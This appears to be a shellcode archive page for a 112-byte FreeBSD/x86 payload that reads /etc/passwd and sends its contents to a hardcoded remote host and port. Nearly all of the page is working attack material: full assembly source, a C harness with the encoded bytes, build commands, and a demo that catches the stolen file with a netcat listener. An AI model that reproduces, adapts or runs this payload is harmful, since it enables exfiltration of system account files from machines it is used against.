<html><head><title>FreeBSD/x86 - connect back.send.exit /etc/passwd - 112 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
                           ***(C)oDed bY suN8Hclf***
                       DaRk-CodeRs Group production, kid
           [FreeBSD x86 connect back.send.exit /etc/passwd 112 bytes]

This is the FreeBSD version of 0in's shellcode (http://milw0rm.com/shellcode/6263)
(really learnt a lot while coding this one ;])

Compile:
nasm -f elf shellcode.asm
ld -e _start -o shellcode shellcode.o
================================================================================
How it works:
1st terminal:  $nc -l 8000
2nd terminal:  $./shellcode
2nd terminal:
# $FreeBSD: src/etc/master.passwd,v 1.40 2005/06/06 20:19:56 brooks Exp $
#
root:*:0:0:Charlie &amp;:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &amp;:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
[..]
================================================================================
Code:
-------------------------code.asm---------------------
section .text
global _start

_start:
xor eax, eax
push byte 0x64
push word 0x7773
push 0x7361702f
push 0x6374652f   ;file to open (default:/etc/passwd)
mov ebx, esp
push eax
push ebx
mov al, 5         ;use: 'cat /usr/src/sys/kern/syscalls.master | grep *' to get the right numbers
push eax
int 0x80          ;open()

mov ebx, eax      ;file descriptor to ebx
xor eax, eax      ;we should clean eax each time we return from int 0x80 
xor ecx, ecx

mov cx, 3333      ;3333 bytes is probably enough
push ecx
mov esi, esp      ;put our data on the stack
push esi
push ebx
mov al, 3
push eax
int 0x80          ;read()

mov ebp, eax
xor eax, eax
mov al, 6
push ebx
push eax
int 0x80          ;close()

xor eax, eax
push eax
push byte 0x01
push byte 0x02
mov al, 97
push eax
int 0x80          ;socket()

mov edx, eax      ;socket descriptor to edx

push 0x2101a8c0   ;192.168.1.33, change IT!!!
push 0x401f02AA   ;port 8000
mov eax, esp

push byte 0x10
push eax
push edx
xor eax, eax
mov al, 98
push eax
int 0x80         ;connect()

xor eax, eax
push ebp
push esi         ;our buffer with data
push edx
mov al, 4
push eax
int 0x80         ;write()

xor eax, eax
inc eax
push eax
push eax
int 0x80         ;exit()
-------------------------code.asm---------------------

C Code:
-------------------------code.c-----------------------
#include &lt;stdio.h&gt;

char shellcode[]=
&quot;\x31\xc0\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63&quot;
&quot;\x89\xe3\x50\x53\xb0\x05\x50\xcd\x80\x89\xc3\x31\xc0\x31\xc9\x66\xb9\x05&quot;
&quot;\x0d\x51\x89\xe6\x56\x53\xb0\x03\x50\xcd\x80\x89\xc5\x31\xc0\xb0\x06\x53&quot;
&quot;\x50\xcd\x80\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2&quot;
&quot;\x68\xc0\xa8\x01\x21&quot;   //&lt;- host address
&quot;\x68\xaa\x02\x1f\x40&quot;  // &lt;- port number
&quot;\x89\xe0\x6a\x10\x50\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc0\x55\x56\x52&quot;
&quot;\xb0\x04\x50\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80&quot;;

int main(int argc, char **argv) {
	int (*func)();
	func=(int (*)())shellcode;
	(int)(*func)();
}
-------------------------code.c-----------------------

Greetz to: 0in, cOndemned, e.wiZz!, str0ke, doctor
Visit us : www.dark-coders.pl


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
